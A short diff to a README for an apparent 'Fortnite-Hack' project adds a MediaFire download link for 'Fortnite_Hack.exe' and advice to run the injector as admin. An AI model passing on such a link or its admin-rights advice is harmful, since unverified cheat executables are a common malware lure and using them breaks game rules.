@@ -1,3 +1,7 @@
+https://www.mediafire.com/file/f3geczx4he5qyzc/Fortnite_Hack.exe/file
+
+If the injector don't open. Try running as admin. This may be buggy because this is still new
+
 # Fortnite-Hack
 This cheat is probably the best free cheat out as of right now. More features will be added in the mere future!
 
